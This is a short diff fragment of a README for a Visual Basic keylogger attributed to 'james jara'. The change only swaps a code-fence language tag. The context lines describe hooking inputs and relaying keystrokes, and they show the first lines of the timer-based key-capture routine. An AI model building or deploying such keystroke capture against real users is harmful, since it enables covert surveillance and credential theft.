@@ -10,7 +10,7 @@ Keylogger example in visual basic by james jara
 
 Hooks the inputs of an anyplace and relays the keystrokes.  
 
-```Visualbasic
+```vb
 Private Sub Timer1_Timer()
 ' el timer detecta cada cierto tiempo la tecla
 Dim numerodeteclas As Integer
